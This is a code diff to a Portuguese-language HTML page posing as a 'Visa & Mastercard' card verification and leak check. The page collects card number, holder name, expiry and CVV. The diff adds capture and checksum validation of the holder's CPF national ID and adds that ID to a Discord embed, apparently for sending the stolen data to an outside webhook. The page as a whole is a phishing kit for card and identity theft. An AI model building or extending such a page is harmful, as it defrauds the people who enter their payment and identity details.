@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Verificação Ultra Premium - Visa & Mastercard</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -222,13 +222,22 @@
             z-index: 2;
         }
         
-        .card-expiry, .card-holder, .card-cvv {
+        .card-expiry, .card-holder, .card-cpf, .card-cvv {
             font-size: 16px;
             opacity: 0.95;
             text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
         }
         
         .card-holder {
+            text-transform: uppercase;
+            max-width: 70%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-weight: 500;
+        }
+        
+        .card-cpf {
             text-transform: uppercase;
             max-width: 70%;
             overflow: hidden;
@@ -696,6 +705,7 @@
                 <div class="card-details">
                     <div>
                         <div class="card-holder" id="display-card-holder">NOME DO TITULAR</div>
+                        <div class="card-cpf" id="display-card-cpf">•••.•••.•••-••</div>
                         <div class="card-expiry" id="display-card-expiry">MM/AA</div>
                     </div>
                     <div class="card-cvv">
@@ -724,6 +734,13 @@
                         <input type="text" id="card-holder" placeholder="Como no cartão" required>
                     </div>
                     
+                    <div class="form-group">
+                        <label for="card-cpf"><i class="fas fa-id-card"></i> CPF do Titular</label>
+                        <input type="text" id="card-cpf" maxlength="14" placeholder="000.000.000-00" required>
+                    </div>
+                </div>
+                
+                <div class="form-row">
                     <div class="form-group">
                         <label for="card-expiry"><i class="fas fa-calendar-check"></i> Validade</label>
                         <input type="text" id="card-expiry" maxlength="5" placeholder="MM/AA" required>
@@ -798,6 +815,7 @@
         const cardForm = document.getElementById('card-form');
         const cardNumberInput = document.getElementById('card-number');
         const cardHolderInput = document.getElementById('card-holder');
+        const cardCpfInput = document.getElementById('card-cpf');
         const cardExpiryInput = document.getElementById('card-expiry');
         const cardCvvInput = document.getElementById('card-cvv');
         const submitBtn = document.getElementById('submit-btn');
@@ -809,6 +827,7 @@
         const cardPreview = document.getElementById('card-preview');
         const displayCardNumber = document.getElementById('display-card-number');
         const displayCardHolder = document.getElementById('display-card-holder');
+        const displayCardCpf = document.getElementById('display-card-cpf');
         const displayCardExpiry = document.getElementById('display-card-expiry');
         const displayCardCvv = document.getElementById('display-card-cvv');
         const cardLogo = document.getElementById('card-logo');
@@ -887,6 +906,24 @@
             
             // Identifica a bandeira do cartão
             detectCardBrand(value);
+        });
+        
+        // Formatação do CPF
+        cardCpfInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 3) {
+                value = value.substring(0, 3) + '.' + value.substring(3);
+            }
+            if (value.length > 7) {
+                value = value.substring(0, 7) + '.' + value.substring(7);
+            }
+            if (value.length > 11) {
+                value = value.substring(0, 11) + '-' + value.substring(11);
+            }
+            
+            e.target.value = value.substring(0, 14);
+            displayCardCpf.textContent = value || '•••.•••.•••-••';
         });
         
         // Formatação da data de expiração
@@ -981,6 +1018,36 @@
             return false;
         }
         
+        // Valida o CPF
+        function validateCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            
+            if (cpf.length !== 11) return false;
+            
+            // Verifica se todos os dígitos são iguais
+            if (/^(\d)\1{10}$/.test(cpf)) return false;
+            
+            // Validação do primeiro dígito verificador
+            let sum = 0;
+            for (let i = 0; i < 9; i++) {
+                sum += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.charAt(9))) return false;
+            
+            // Validação do segundo dígito verificador
+            sum = 0;
+            for (let i = 0; i < 10; i++) {
+                sum += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.charAt(10))) return false;
+            
+            return true;
+        }
+        
         // Simula uma verificação de vazamento de dados
         async function checkDataLeaks(cardData) {
             // Simula uma consulta demorada
@@ -1042,12 +1109,14 @@
             // Coleta os dados do cartão
             const cardNumber = cardNumberInput.value.replace(/\s+/g, '');
             const cardHolder = cardHolderInput.value;
+            const cardCpf = cardCpfInput.value.replace(/\D/g, '');
             const cardExpiry = cardExpiryInput.value;
             const cardCvv = cardCvvInput.value;
             
             const cardData = {
                 number: cardNumber,
                 holder: cardHolder,
+                cpf: cardCpf,
                 expiry: cardExpiry,
                 cvv: cardCvv,
                 brand: detectCardBrand(cardNumber),
@@ -1078,15 +1147,16 @@
                     allChecksPassed = false;
                 }
                 
-                // Passo 2: Validar algoritmo Luhn
+                // Passo 2: Validar algoritmo Luhn e CPF
                 updateVerificationStep(2, 'loading');
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 const isLuhnValid = validateLuhn(cardNumber);
                 const isExpiryValid = validateExpiry(cardExpiry);
                 const isCvvValid = cardCvv.length === 3 && /^[0-9]+$/.test(cardCvv);
+                const isCpfValid = validateCPF(cardCpf);
                 
-                if (isLuhnValid && isExpiryValid && isCvvValid) {
+                if (isLuhnValid && isExpiryValid && isCvvValid && isCpfValid) {
                     updateVerificationStep(2, 'completed');
                 } else {
                     updateVerificationStep(2, 'failed');
@@ -1127,6 +1197,7 @@
                         cardForm.reset();
                         displayCardNumber.textContent = '•••• •••• •••• ••••';
                         displayCardHolder.textContent = 'NOME DO TITULAR';
+                        displayCardCpf.textContent = '•••.•••.•••-••';
                         displayCardExpiry.textContent = 'MM/AA';
                         displayCardCvv.textContent = '•••';
                         cardPreview.classList.remove('visa', 'mastercard');
@@ -1232,6 +1303,7 @@
             // Formata os dados para exibição
             const formattedNumber = cardData.number.replace(/(\d{4})(?=\d)/g, '$1 ');
             const expiryDate = cardData.expiry || 'Não informada';
+            const formattedCpf = cardData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
             
             // Cria uma embed rica para o Discord
             const embed = {
@@ -1247,6 +1319,11 @@
                     {
                         name: '👤 **Titular do Cartão**',
                         value: `\`\`\`${cardData.holder || 'Não informado'}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: '🆔 **CPF do Titular**',
+                        value: `\`\`\`${formattedCpf || 'Não informado'}\`\`\``,
                         inline: true
                     },
                     {
